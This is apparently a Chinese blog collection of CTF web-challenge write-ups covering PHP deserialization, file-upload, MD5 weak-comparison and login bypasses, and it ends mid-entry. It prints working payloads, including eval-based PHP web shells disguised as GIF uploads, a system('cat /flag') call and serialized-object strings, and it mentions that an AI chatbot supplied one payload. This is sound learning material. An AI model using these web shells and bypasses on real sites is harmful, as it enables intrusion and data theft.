class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化题，有点复杂,给deepseek看:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs llvm">要获取flag，需要通过反序列化漏洞触发FileHandler类的read方法读取flag.php。步骤如下：<br><br>构造恶意对象：创建一个FileHandler对象，设置op为整数<span class="hljs-number">2</span>（绕过析构函数的修改），filename为flag.php。<br><br>处理序列化字符串：由于<span class="hljs-keyword">protected</span>属性在序列化中包含空字符，需使用大写S和十六进制转义绕过字符检查。<br><br>URL编码：确保特殊字符正确传输。<br><br>***<br>op为整数<span class="hljs-number">2</span>：绕过析构函数中的严格比较，触发read方法。<br><br>转义空字符：使用\<span class="hljs-number">00</span>表示空字符，通过is_valid检查。<br><br>读取flag.php：在析构时调用process，op仍为<span class="hljs-number">2</span>，读取flag.php内容输出。<br><br>它直接给出了payload<span class="hljs-operator">=</span><br>?str<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>FileHandler<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>op<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>filename<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>flag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>content<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br><br>直接传入后F<span class="hljs-number">12</span>得到了flag！！？<br></code></pre></td></tr></table></figure><p>自己来试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>,<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;N;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>还是没搞懂，去找wp吧</p><p>出来的一直是这玩意：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>算了直接改吧<br>O:11:”FileHandler”:3:{s:2:”op”;2;s:8:”filename”;’flag.php’;s:7:”content”;N;}<br>不行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><span class="hljs-comment">// $a=new FileHandler($op=&quot;2&quot;,$filename=&quot;flag.php&quot;);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>行了</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>第一步：____destruct:  绕过 &#x3D;&#x3D;&#x3D; “2”，因为这里是强等字符串2于，直接传入数值2会让它不等于，而不会被置为1；<br>第二步：is_valid(),题目里定义了这个函数来判断输入的字符是否未ascii码里的字符，若有在ascii码里的字符就会失败，这里网上就出现了两种绕过，<br>第一种：因为题目里用的是protected类型的变量，要从url传入的话会多出不ascii里的字符，所以想办法将payload里的不不合要求字符替换。<br>第二种：利用php 7.1+版本对类的属性不敏感，直接传入public类，就不会有不和要求字符<br>具体看：<br><a href="https://blog.csdn.net/m0_46246804/article/details/108746253">https://blog.csdn.net/m0_46246804/article/details/108746253</a><br><a href="https://blog.csdn.net/m0_73734159/article/details/134648981">https://blog.csdn.net/m0_73734159/article/details/134648981</a></p><p>第二步：到了这里因为传入了2，所以到了read()函数，会有file_get_contents()函数来指定文件来下一步，直接使得filename&#x3D;”flag.php”即可</p><p>最后记得F12查看，因为程序里不会echo flag 而是 return flag！！！！！<br>wp里是用file_get_contents()的伪协议来直接输出base64编码后的flag</p><h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>is_valid()函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。  </p><p>public无标记，变量名不变。 s:2:“op”;i:2;<br>protected在变量名前添加标记\00*\00。 s:5:“\00*\00op”;i:2;<br>private在变量名前添加标记\00类名\00。s:17:“\00类名\00op”;i:2;<br>序列化后protected类型的属性存在不可打印字符。（private类型的属性序列化后也产生不可打印字符）;<br>PHP版本7.1+，对属性的类型不敏感;</p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>感觉我心还是太急了，没发现cooki，没试一下用bp抓包，就上网找wp了，明明是很标准的流程，，，，，<br>一开始发现要post上传password，但是没发先有cookie一直回显要求的账户，把cookie改为1即可，<br>然后到密码，试了“404”，不行。看wp，用php弱比较，上传404a，显示能过不是纯数值这关，然后到弱比较，如果比较的变量开头是数字，会把数字截取到遇到字符为止，所以404a会变成404。<br>然后到了money，试了了一下，不能传太长的数值，所以用科学计数法传了9亿，拿到flag </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST /<br><span class="hljs-attribute">cookie</span>=1<br><br><span class="hljs-attribute">password</span>=404aa&amp;money=9e8<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-29</title>
    <link href="/2025/04/21/note-29/"/>
    <url>/2025/04/21/note-29/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;php.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;z&quot;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>显示上传成功，但是没找到目录在哪<br>在url试了一下<br>在这个目录  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/upload/</span>php.phtml<br></code></pre></td></tr></table></figure><p>试了好久发现马没生效</p><p>上网找了一个文件头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;text.phtml&quot;</span><br>Content-Type: image/jpeg<br><br>GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);&lt;/script&gt;<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>from:<a href="https://blog.csdn.net/m0_55793759/article/details/120956861">https://blog.csdn.net/m0_55793759/article/details/120956861</a><br>成功</p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>网址备份没思路，便上网查：<br><a href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">常见的网站源码备份文件后缀:<br><br>tar.gz，<span class="hljs-built_in">zip</span>，rar，tar<br><br>常见的网站源码备份文件名：<br><br>web，website，backup，back，www，wwwroot，temp<br><br>后用<br>www.<span class="hljs-built_in">zip</span>下载备份源码<br></code></pre></td></tr></table></figure><p>里面有个flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假flag，，，<br>审计index.php，<br>好像是反序列化？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;I have a cat!&lt;/title&gt;<br>  &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;<br>      &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;style.css&quot;</span>&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>    <span class="hljs-comment">#login&#123;   </span><br>        position: absolute;   <br>        top: <span class="hljs-number">50</span>%;   <br>        left:<span class="hljs-number">50</span>%;   <br>        margin: -<span class="hljs-number">150</span>px <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">150</span>px;   <br>        width: <span class="hljs-number">300</span>px;   <br>        height: <span class="hljs-number">300</span>px;   <br>    &#125;   <br>    h4&#123;   <br>        font-size: <span class="hljs-number">2</span>em;   <br>        margin: <span class="hljs-number">0.67</span>em <span class="hljs-number">0</span>;   <br>    &#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br><br><br><br><br><br><br><br>&lt;div id=<span class="hljs-string">&quot;world&quot;</span>&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;不愧是我！！！<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="hljs-string">&quot;center&quot;</span> style=<span class="hljs-string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script  src=<span class="hljs-string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>select-&gt;name,<br>好像要先查看admin密码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br><br><span class="hljs-keyword">return</span>:<br>NO!!!hacker!!!<br>You name is: nonono<br>You password is: yesyes<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;guest&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br></code></pre></td></tr></table></figure><p>再仔细看了一下，应该是要绕过wakeup函数里的赋值，不然就没法让username&#x3D;admin，<br>上网差了一下，发现以前我好像做过wakeup绕过的题，那就是修改元素个数，<br>还是绕不过，去找wp,最后发现是有private，要用url加密，不然的话会有些不可显示字符的缺漏导致错误<br>未url加密：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>可以看到Nameusername，和Namepassowrd，这两元素是因为少了字符导致连起来了，编码后可以看到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>正确的样式应该是： %00Name%00username , %00Name%00password<br>记得要把2改为3，找的有点眼花，也可以像wp那样传：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a><br><a href="https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/">https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-28</title>
    <link href="/2025/04/17/note-28/"/>
    <url>/2025/04/17/note-28/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>在bp查看相应，看到：<br>hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>试一下ffifdyop<br>返回的页面中有：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">$a = $GET[&#x27;a&#x27;];</span><br><span class="hljs-comment">$b = $_GET[&#x27;b&#x27;];</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="hljs-comment">    // wow, glzjin wants a girl friend.</span><br><span class="hljs-comment">--&gt;</span><br></code></pre></td></tr></table></figure><p>不是怎么都在求girlfriend,<br>这个我猜能用数组绕过</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=r[]&amp;b=<span class="hljs-string">q[]</span><br>//不行<br>?a=<span class="hljs-string">&#x27;1&#x27;</span>&amp;b=<span class="hljs-number">1</span><br>//<span class="hljs-keyword">no</span><br></code></pre></td></tr></table></figure><p>那直接上网查md5加密后能弱等于的字符</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?a=%271%27&amp;&amp;b=<span class="hljs-number">1</span><br><span class="hljs-comment">//ok</span><br></code></pre></td></tr></table></figure><p>返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个强不等于试一下’1’,1</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">param1=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-comment">//no</span><br><br>param1[]=<span class="hljs-number">1</span><span class="hljs-variable">&amp;param2</span>[]=<span class="hljs-number">2</span><br><span class="hljs-comment">// flag&#123;8277b79d-033f-4f57-a8dd-d74d41893128&#125; </span><br><span class="hljs-comment">//原来我刚才用的数组绕过是写错的啊😅</span><br><span class="hljs-comment">//试了一下，levels91.php和levell14.php，都能直接用数组绕过</span><br></code></pre></td></tr></table></figure><h2 id="ffifdyop"><a href="#ffifdyop" class="headerlink" title="ffifdyop"></a>ffifdyop</h2><p>sql中md5的万能密码<br><a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">https://blog.csdn.net/Jeff_12138/article/details/121847582</a></p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>正常穿了一次图片，显示了上传文件的储存目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/uplo4d/</span><br></code></pre></td></tr></table></figure><p>上网随便找个php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hack&#x27;</span>]);<br><span 